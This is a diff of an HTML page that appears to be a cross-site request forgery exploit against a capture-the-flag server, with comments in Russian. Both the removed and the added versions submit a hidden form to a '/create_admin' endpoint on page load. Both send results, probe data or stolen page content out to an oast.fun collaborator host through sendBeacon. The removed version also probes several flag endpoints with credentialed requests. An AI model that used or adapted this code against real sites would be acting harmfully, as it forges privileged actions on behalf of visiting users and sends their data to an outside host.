@@ -1,54 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="referrer" content="no-referrer">
-</head>
 <body>
+<iframe id="resultFrame" name="resultFrame" style="display:none"></iframe>
+
+<form id="p" action="https://tasks.goidactf.ru:20431/create_admin" method="POST" target="resultFrame">
+    <input type="hidden" name="new_admin_login" value="hacker_2026_flag">
+</form>
+
 <script>
-const TARGET = 'https://tasks.goidactf.ru:20431';
-const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+// Отправляем форму
+document.getElementById('p').submit();
 
-// Метод 1: Прямая форма (основной)
-const form1 = document.createElement('form');
-form1.method = 'POST';
-form1.action = TARGET + '/create_admin';
-form1.target = '_blank';
-form1.innerHTML = '<input name="new_admin_login" value="EXPLOIT_1">';
-document.body.appendChild(form1);
-form1.submit();
-
-// Метод 2: fetch с no-cors (на всякий случай)
-setTimeout(() => {
-    fetch(TARGET + '/create_admin', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        credentials: 'include',
-        mode: 'no-cors',
-        body: 'new_admin_login=EXPLOIT_2'
-    });
-}, 1000);
-
-// Метод 3: Пытаемся прочитать результат через 3 секунды
-setTimeout(() => {
-    fetch(TARGET + '/admin', {
-        credentials: 'include',
-        mode: 'no-cors'
-    }).then(() => {
-        // Если запрос прошёл (даже без чтения тела) - админ доступен
-        navigator.sendBeacon(COLLAB + '/admin_accessible', 'yes');
-    });
-    
-    // Проверяем другие endpoints на наличие флага
-    ['/flag', '/getflag', '/api/flag', '/dashboard'].forEach(endpoint => {
-        const img = new Image();
-        img.onload = () => navigator.sendBeacon(COLLAB + endpoint, 'loaded');
-        img.onerror = () => navigator.sendBeacon(COLLAB + endpoint, 'error');
-        img.src = TARGET + endpoint;
-    });
-}, 3000);
-
-// Сигнал о выполнении
-navigator.sendBeacon(COLLAB + '/started', 'executed');
+// Слушаем загрузку iframe
+document.getElementById('resultFrame').onload = function() {
+  setTimeout(() => {
+    try {
+      // Пытаемся прочитать iframe с результатом
+      const iframe = document.getElementById('resultFrame');
+      const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+      const result = iframeDoc.body.innerHTML;
+      
+      // Отправляем результат
+      navigator.sendBeacon(
+        "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/capture",
+        result.substring(0, 2000)
+      );
+    } catch(e) {
+      // CORS блокирует чтение
+      navigator.sendBeacon(
+        "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/error",
+        "CORS blocked: " + e.message
+      );
+    }
+  }, 1000);
+};
 </script>
 </body>
 </html>
